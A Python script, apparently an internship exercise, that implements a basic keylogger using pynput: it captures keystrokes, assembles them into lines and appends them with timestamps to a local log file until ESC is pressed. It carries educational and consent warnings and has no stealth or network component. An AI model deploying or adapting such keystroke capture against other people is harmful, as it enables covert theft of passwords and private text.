# Task 04 - Basic Keylogger
# Prodigy InfoTech Cyber Security Internship
# Author: Veer Nagadwala
#
# A keylogger is a program that records every key you press on the keyboard.
# Hackers use these to steal passwords, but security professionals study them
# to understand how to detect and stop them.
#
# This is built purely for learning - to understand how keyloggers work
# so we know how to defend against them.
#
# ⚠️ Only run this on your own computer. Using it on someone else's
#    device without permission is illegal.
#
# Install requirement: pip install pynput

from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "keylog.txt"

# We collect keys typed in a line, then save the whole line when Enter is pressed
current_line = []


def on_key_press(key):
    global current_line

    try:
        # Normal letter/number/symbol key
        current_line.append(key.char)

    except AttributeError:
        # Special keys like Space, Enter, Backspace etc.

        if key == keyboard.Key.space:
            current_line.append(" ")

        elif key == keyboard.Key.enter:
            # Save the completed line to file
            line = "".join(current_line)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            with open(LOG_FILE, "a") as f:
                f.write(f"[{timestamp}]  {line}\n")

            print(f"Logged: {line}")
            current_line = []  # Reset for next line

        elif key == keyboard.Key.backspace:
            # Remove last character if user pressed backspace
            if current_line:
                current_line.pop()

        elif key == keyboard.Key.tab:
            current_line.append("  ")

        elif key == keyboard.Key.esc:
            # Save anything remaining and stop
            print("\nESC pressed - stopping keylogger...")

            if current_line:
                line = "".join(current_line)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(LOG_FILE, "a") as f:
                    f.write(f"[{timestamp}]  {line}  [session ended]\n")

            return False  # This stops the listener


def main():
    print("\n======================================")
    print("   Basic Keylogger")
    print("   Prodigy InfoTech | Task 04")
    print("======================================")
    print("\n⚠️  For educational purposes only!")
    print(f"\nStarting keylogger... Saving logs to: {os.path.abspath(LOG_FILE)}")
    print("Press ESC to stop.\n")

    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

    print(f"\nKeylogger stopped. Check '{LOG_FILE}' to see the recorded keys.")


if __name__ == "__main__":
    main()
